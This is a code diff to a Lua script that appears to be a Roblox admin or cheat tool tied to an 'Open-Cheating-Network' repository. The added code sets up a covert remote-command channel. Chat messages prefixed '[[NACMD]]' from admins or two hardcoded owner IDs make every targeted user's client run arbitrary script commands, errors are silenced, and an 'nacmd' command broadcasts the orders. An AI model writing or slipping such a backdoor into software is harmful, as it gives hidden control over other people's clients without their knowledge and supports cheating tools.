@@ -43391,6 +43391,8 @@ do
 			blue = Color3.fromRGB(120, 170, 255)
 		}
 
+		local CONTROL_PREFIX = "[[NACMD]]"
+
 		local INTEGRATION_URL = "https://raw.githubusercontent.com/ltseverydayyou/Open-Cheating-Network/refs/heads/main/Client/Main.lua"
 		local connect
 
@@ -43888,8 +43890,53 @@ do
 				local senderName = tostring(name or "?")
 				local messageText = tostring(msg or "")
 
-				local isNAadmin = (isAdmin == true)
 				local isOwner = userId == 11761417 or userId == 530829101
+
+				if Sub(messageText, 1, #CONTROL_PREFIX) == CONTROL_PREFIX then
+					if not (isAdmin == true or isOwner) then
+						return
+					end
+
+					local raw = Sub(messageText, #CONTROL_PREFIX + 1)
+					local ok, data = pcall(function()
+						return hs:JSONDecode(raw)
+					end)
+					if not ok or type(data) ~= "table" or data.kind ~= "remote_cmd" then
+						return
+					end
+
+					local lp = Players.LocalPlayer
+					local myId = lp and lp.UserId
+					local targets = data.targets
+					local args = data.args
+					if not (myId and type(targets) == "table" and type(args) == "table") then
+						return
+					end
+
+					local runForMe = false
+					for _, v in ipairs(targets) do
+						if v == "all" or v == myId then
+							runForMe = true
+							break
+						end
+					end
+					if not runForMe then
+						return
+					end
+
+					SpawnCall(function()
+						local okRun, err = pcall(function()
+							cmd.run(args)
+						end)
+						if not okRun then
+							warn("[NA Chat] remote cmd error: " .. tostring(err))
+						end
+					end)
+
+					return
+				end
+
+				local isNAadmin = (isAdmin == true)
 
 				local labelText
 				if isOwner then
@@ -43959,6 +44006,48 @@ do
 
 				serverUsers = newSet
 			end)
+
+			if NAChat.service.OnRemoteCommand then
+				NAChat.service.OnRemoteCommand.Event:Connect(function(fromId, fromName, argList, target)
+					local lp = Players.LocalPlayer
+					if not lp then
+						return
+					end
+					local myId = lp.UserId
+
+					local runForMe = false
+					if target == nil or target == "" or target == "all" then
+						runForMe = true
+					else
+						local tNum = tonumber(target)
+						if tNum and tNum == myId then
+							runForMe = true
+						end
+					end
+
+					if not runForMe then
+						return
+					end
+
+					if type(argList) ~= "table" or #argList == 0 then
+						return
+					end
+
+					local args = {}
+					for i, v in ipairs(argList) do
+						args[i] = tostring(v)
+					end
+
+					SpawnCall(function()
+						local ok, err = pcall(function()
+							cmd.run(args)
+						end)
+						if not ok and DoNotif then
+							--DoNotif("[NA Chat] Remote cmd error: " .. tostring(err), 4)
+						end
+					end)
+				end)
+			end
 
 			NAChat.service.OnConnected.Event:Connect(function(name, _, hidden)
 				NAChat.connecting = false
@@ -44158,7 +44247,7 @@ do
 
 		Spawn(function()
 			while true do
-				Wait(1)
+				Wait(2)
 				refreshStatus()
 			end
 		end)
@@ -44169,6 +44258,77 @@ do
 			if ok and saved ~= nil then
 				initialHidden = saved == true
 			end
+		end
+
+		local function isLocalAdmin()
+			local lp = Players.LocalPlayer
+			if not lp then
+				return false
+			end
+			local list = rawget(_G, "NAadminsLol")
+			if type(list) ~= "table" then
+				return false
+			end
+			for _, id in ipairs(list) do
+				if id == lp.UserId then
+					return true
+				end
+			end
+			return false
+		end
+
+		local function findTargets(spec)
+			spec = Lower(tostring(spec or ""))
+			if spec == "all" or spec == "*" then
+				return { "all" }
+			end
+
+			local matches = {}
+			for _, info in ipairs(NAChat.users or {}) do
+				if type(info) == "table" then
+					local uname = Lower(tostring(info.username or ""))
+					local uid = tonumber(info.userId)
+					if uid and Sub(uname, 1, #spec) == spec then
+						Insert(matches, uid)
+					end
+				end
+			end
+			return matches
+		end
+
+		if isLocalAdmin() then
+			cmd.add({"nacmd","naremote"}, {"nacmd"}, function(targetSpec, ...)
+				local svc = NAChat.service
+				if not (svc and svc.IsConnected and svc.IsConnected()) then
+					originalIO.setStatus("NA Chat: not connected", STATUS_COLORS.err)
+					return
+				end
+
+				local args = { ... }
+				if #args == 0 then
+					return
+				end
+
+				local targets = findTargets(targetSpec)
+				if #targets == 0 then
+					return
+				end
+
+				local ok, payload = pcall(function()
+					return hs:JSONEncode({
+						kind = "remote_cmd",
+						targets = targets,
+						args = args
+					})
+				end)
+				if not ok or type(payload) ~= "string" or payload == "" then
+					return
+				end
+
+				if svc.SendMessage then
+					svc.SendMessage(CONTROL_PREFIX .. payload)
+				end
+			end, true)
 		end
 
 		switchTab("chat")
